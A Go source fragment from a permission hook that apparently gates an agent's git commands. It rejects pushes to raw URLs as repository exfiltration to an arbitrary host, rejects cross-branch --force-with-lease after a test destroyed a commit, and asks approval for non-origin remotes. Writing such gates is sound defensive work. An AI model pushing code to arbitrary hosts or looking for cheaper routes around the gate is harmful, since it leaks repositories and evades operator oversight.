		return reject("git: pushing to a URL is prohibited — " + dest + " is a network destination, not a configured remote, so this sends repository contents to an arbitrary host with no `git remote` change to show for it (pg2-abb65, 2026-07-30). It is refused for the same exfiltration reason `git remote set-url` is, and refused rather than prompted so it is not the cheaper way around that gate. Push to a configured remote by NAME, or hand the push to the operator")
	}

	// --force-with-lease: CROSS-BRANCH is Reject, SAME-BRANCH stays approvable.
	//
	// Cross-branch is a Reject on measured evidence (2026-07-30): pushing `main`
	// onto a divergent `other` with a FRESH lease exited 0 with `+ d3167d6...3cdea6c
	// main -> other (forced update)` and DESTROYED the unique commit on `other`.
	// The lease only pins the ref it NAMED, so it gives zero protection against
	// naming the wrong branch — the safety property the same-branch idiom relies on
	// is simply absent here, which is why this half cannot stay an Ask while the
	// force spellings above are Rejects.
	//
	// Same-branch --force-with-lease is the correct post-rebase idiom and is in
	// daily use, so it MUST fall through to Approve.
	//
	// SEMANTIC TRAP: in `--force-with-lease=<refname>:<expect>` the colon separates
	// the ref from the EXPECTED OBJECT ID, not local from remote. So
	// `--force-with-lease=main:abc123 origin main` is a SAME-branch push carrying an
	// explicit lease — the safest form there is. The lease VALUE is therefore
	// deliberately NOT read here; cross-branch-ness comes only from the push
	// REFSPEC OPERANDS (`main:other`), which is what ClassifyPushRefspecs returns.
	if cmdparse.HasLongFlagPrefix(rest, "force-with-lease") {
		for _, rs := range refspecs {
			// SameRef treats `HEAD:main` as cross-branch: HEAD cannot be resolved
			// from a token, and for a gate the safe reading is cross-branch. Name the
			// branch (`main`, or `main:main`) to get the same-branch verdict.
			if !rs.SameRef() {
				return reject("git: --force-with-lease onto a DIFFERENT remote branch is prohibited — refspec " + rs.Raw + " pushes to another ref, and the lease protects only the ref it NAMES (measured 2026-07-30: it force-updated the destination and destroyed its unique commit). Push to the same branch name instead")
			}
		}
		// A non-origin NAMED remote keeps the Ask it has today. The lease is
		// same-branch, so the ruling's Reject does not reach it, but nothing about
		// pg2-bohpm justifies LOOSENING an existing Ask either — this rule's changes
		// are one-directional. Since pg2-abb65 this branch no longer sees a URL
		// destination: that is Rejected above, deliberately ordered ahead of here so
		// this Ask cannot shadow it. FirstOperand's separated-value shift can still
		// put a flag VALUE here (`--force-with-lease -o x main` reads `x` as the
		// remote), which lands on the safe side — an Ask.
		if remote, _ := cmdparse.FirstOperand(rest); remote != "" && remote != "origin" {
			return hookio.RuleResult{
				Decision: hookio.Ask,
				Reason:   "git: --force-with-lease to a remote other than origin (" + remote + ")",
				Module:   r.Name(),
			}, true
		}
	}
	return hookio.RuleResult{}, false
}
